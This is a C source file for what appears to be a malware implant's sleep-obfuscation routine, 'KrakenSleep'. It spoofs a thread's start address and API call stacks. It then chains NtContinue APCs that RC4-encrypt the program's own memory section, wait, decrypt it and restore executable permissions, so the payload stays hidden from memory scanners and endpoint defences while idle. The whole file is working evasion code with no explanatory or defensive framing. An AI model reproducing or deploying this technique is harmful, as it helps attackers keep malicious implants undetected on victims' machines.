#include "kraken.h"

VOID KrakenSleep(DWORD dwSleepTime) {
	DWORD dwTid = 0;

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;

	CONTEXT ctxA = { 0 };
	CONTEXT ctxB = { 0 };
	CONTEXT ctxC = { 0 };
	CONTEXT ctxD = { 0 };
	CONTEXT ctxE = { 0 };
	CONTEXT ctxEvent = { 0 };
	CONTEXT ctxEnd = { 0 };

	PVOID pNtdllAddr							= GetNtdllAddr();
	PVOID pAdvAPI								= SPOOF(LoadLibraryA, "Advapi32");
	
	UINT_PTR pTpReleaseCleanupGroupMembers					= SPOOF(GetProcAddress, pNtdllAddr, "TpReleaseCleanupGroupMembers");
	PVOID	 pNtContinue							= SPOOF(GetProcAddress, pNtdllAddr, "NtContinue");
	PVOID pNtTestAlert							= SPOOF(GetProcAddress, pNtdllAddr, "NtTestAlert");
	PVOID pSystemFunction032						= SPOOF(GetProcAddress, pAdvAPI, "SystemFunction032");

	fnNtAlertResumeThread pNtAlertResumeThread				= SPOOF(GetProcAddress, pNtdllAddr, "NtAlertResumeThread");
	fnNtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject	= SPOOF(GetProcAddress, pNtdllAddr, "NtSignalAndWaitForSingleObject");

	HANDLE hEvent = SPOOF_0(CreateEventW);

	BYTE bKey[16] = "AAAAAAAAAAAAAAAA";
	GenerateKey(&bKey, 16);

	SECTION_INFO SecInfo = { 0 };
	TakeSectionInfo(&SecInfo);

	USTRING usKey = { 0 };
	USTRING usData = { 0 };

	usKey.Buffer = bKey;
	usKey.Length = usKey.MaximumLength = 16;

	usData.Buffer = SecInfo.pAddr;
	usData.Length = usData.MaximumLength = SecInfo.dwSize;

	// We spoof the thread start address
	pTpReleaseCleanupGroupMembers += 0x450;
	HANDLE hThread = CreateThread(NULL, 65535, pTpReleaseCleanupGroupMembers, NULL, CREATE_SUSPENDED, &dwTid);

	if (hThread != NULL) {
		DWORD dwOldProtect = 0;
		SPOOF(GetThreadContext, hThread, &ctx);

		RtlCopyMemory(&ctxA, &ctx, sizeof(CONTEXT));
		RtlCopyMemory(&ctxB, &ctx, sizeof(CONTEXT));
		RtlCopyMemory(&ctxC, &ctx, sizeof(CONTEXT));
		RtlCopyMemory(&ctxD, &ctx, sizeof(CONTEXT));
		RtlCopyMemory(&ctxE, &ctx, sizeof(CONTEXT));
		RtlCopyMemory(&ctxEvent, &ctx, sizeof(CONTEXT));
		RtlCopyMemory(&ctxEnd, &ctx, sizeof(CONTEXT));

		ctxA.Rip = VirtualProtect;
		ctxA.Rcx = SecInfo.pAddr;
		ctxA.Rdx = SecInfo.dwSize;
		ctxA.R8 = PAGE_READWRITE;
		ctxA.R9 = &dwOldProtect;
		*(PULONG_PTR)ctxA.Rsp = (ULONG_PTR)pNtTestAlert;


		ctxB.Rip = pSystemFunction032;
		ctxB.Rcx = &usData;
		ctxB.Rdx = &usKey;
		*(PULONG_PTR)ctxB.Rsp = (ULONG_PTR)pNtTestAlert;

		ctxC.Rip = WaitForSingleObject;
		ctxC.Rcx = (HANDLE)-1;
		ctxC.Rdx = dwSleepTime;
		*(PULONG_PTR)ctxC.Rsp = (ULONG_PTR)pNtTestAlert;

		ctxD.Rip = pSystemFunction032;
		ctxD.Rcx = &usData;
		ctxD.Rdx = &usKey;
		*(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)pNtTestAlert;

		ctxE.Rip = VirtualProtect;
		ctxE.Rcx = SecInfo.pAddr;
		ctxE.Rdx = SecInfo.dwSize;
		ctxE.R8 = PAGE_EXECUTE_READWRITE;
		ctxE.R9 = &dwOldProtect;
		*(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)pNtTestAlert;

		ctxEvent.Rip = SetEvent;
		ctxEvent.Rcx = hEvent;
		*(PULONG_PTR)ctxEvent.Rsp = (ULONG_PTR)pNtTestAlert;

		ctxEnd.Rip = ExitThread;
		ctxEnd.Rcx = 0;
		*(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)pNtTestAlert;

		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxA);
		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxB);
		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxC);
		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxD);
		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxE);
		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxEvent);
		SPOOF(QueueUserAPC, (PAPCFUNC)pNtContinue, hThread, &ctxEnd);

		ULONG abcd = 0;
		pNtAlertResumeThread(hThread, &abcd);
		pNtSignalAndWaitForSingleObject( hEvent, hThread, TRUE, NULL);

		SPOOF(TerminateThread, hThread);
	}
	SPOOF(CloseHandle, hThread);

}
